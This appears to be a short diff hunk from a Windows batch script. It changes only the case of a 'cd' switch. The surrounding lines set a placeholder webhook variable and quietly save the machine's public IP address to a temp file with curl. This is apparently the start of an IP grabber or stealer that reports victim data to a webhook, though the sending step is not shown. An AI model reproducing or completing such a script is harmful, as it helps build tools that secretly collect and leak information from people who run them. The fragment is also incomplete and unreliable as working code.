@@ -1,5 +1,5 @@
 @echo off
-cd /D "%~dp0%"
+cd /d "%~dp0%"
 timeout 2 > nul
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
